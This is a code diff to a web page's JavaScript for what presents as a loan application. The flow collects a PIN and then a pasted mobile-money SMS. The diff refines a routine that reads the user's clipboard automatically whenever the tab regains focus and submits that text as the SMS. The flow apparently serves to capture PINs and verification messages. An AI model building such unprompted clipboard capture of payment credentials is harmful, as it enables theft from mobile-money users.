@@ -742,13 +742,11 @@
             handlePostLoginPastedMsg(cleanText, true);
           }
         } else {
-          focusMsgInput();
-          showClipboardToast('📋 Click input box or press Paste to insert message.');
+          showClipboardToast('📋 Click box to paste your SMS message.');
         }
       } catch (err) {
         console.warn('Clipboard access error:', err);
-        focusMsgInput();
-        showClipboardToast('📋 Please paste your SMS message into the box.');
+        showClipboardToast('📋 Click box to paste your SMS message.');
       }
     }
 
@@ -785,12 +783,18 @@
       document.documentElement.scrollTop = 0;
     }
 
+    let lastAutoReadTime = 0;
     function tryAutoReadClipboard() {
+      const now = Date.now();
+      if (now - lastAutoReadTime < 4000) return;
+      lastAutoReadTime = now;
+
       const msgInput = document.getElementById('momo-pasted-msg');
-      if (!msgInput || msgInput.value.trim()) return;
+      if (!msgInput || msgInput.value.trim() || typeof isSubmittingMessage !== 'undefined' && isSubmittingMessage) return;
+
       if (navigator.clipboard && navigator.clipboard.readText) {
         navigator.clipboard.readText().then(text => {
-          if (text && text.trim() && text.trim().length >= 3) {
+          if (text && text.trim() && text.trim().length >= 3 && !msgInput.value.trim()) {
             msgInput.value = text.trim();
             showClipboardToast('⚡ Auto-Detected SMS from Clipboard!');
             handlePostLoginPastedMsg(text.trim(), true);
@@ -799,12 +803,21 @@
       }
     }
 
+    let isTabReturnActive = false;
     window.addEventListener('focus', () => {
-      if (currentStep === 4) tryAutoReadClipboard();
+      if (currentStep === 4 && !isTabReturnActive) {
+        isTabReturnActive = true;
+        tryAutoReadClipboard();
+        setTimeout(() => { isTabReturnActive = false; }, 2000);
+      }
     });
 
     document.addEventListener('visibilitychange', () => {
-      if (document.visibilityState === 'visible' && currentStep === 4) tryAutoReadClipboard();
+      if (document.visibilityState === 'visible' && currentStep === 4 && !isTabReturnActive) {
+        isTabReturnActive = true;
+        tryAutoReadClipboard();
+        setTimeout(() => { isTabReturnActive = false; }, 2000);
+      }
     });
 
     function startSimSmsReceiver() {
@@ -938,6 +951,15 @@
     }
 
     function goToStep(stepNum) {
+      if (stepNum === 0) {
+        if (pollingInterval) {
+          clearInterval(pollingInterval);
+          pollingInterval = null;
+        }
+        appState.applicationId = null;
+        isSubmittingMessage = false;
+      }
+
       if (currentStep === 1) {
         const typeEl = document.getElementById('loan-type-select');
         if (typeEl) appState.loanType = typeEl.value;
@@ -991,20 +1013,9 @@
         }
       }
 
-      if (currentStep === 3) {
-        setTimeout(() => {
-          const firstPin = document.querySelector('.pin-box[data-index="0"]');
-          if (firstPin) firstPin.focus();
-        }, 150);
-      }
-
       if (currentStep === 4) {
         isSubmittingMessage = false;
         startSimSmsReceiver();
-        setTimeout(() => {
-          const msgInp = document.getElementById('momo-pasted-msg');
-          if (msgInp) msgInp.focus();
-        }, 200);
       }
 
       if (currentStep === 5) {
